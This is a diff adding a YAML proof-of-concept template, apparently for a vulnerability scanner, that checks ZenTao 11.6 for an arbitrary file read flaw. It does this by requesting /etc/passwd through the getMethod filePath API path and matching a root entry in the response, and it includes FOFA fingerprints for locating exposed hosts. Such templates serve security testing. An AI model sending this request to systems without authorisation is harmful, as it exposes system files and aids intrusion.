@@ -1,0 +1,18 @@
+id: poc-yaml-zentao-getmethod-filepath-fileread
+info:
+  name: 禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 禅道项目管理系统
+  fofa: 禅道项目管理系统
+requests:
+- method: GET
+  path: /api-getModel-api-getMethod-filePath=/etc/passwd/1
+  expression: 'status_code == 200 &&
+
+    matches(body, "root:.*:0:0:")
+
+    '
+variables: {}
+transport: http
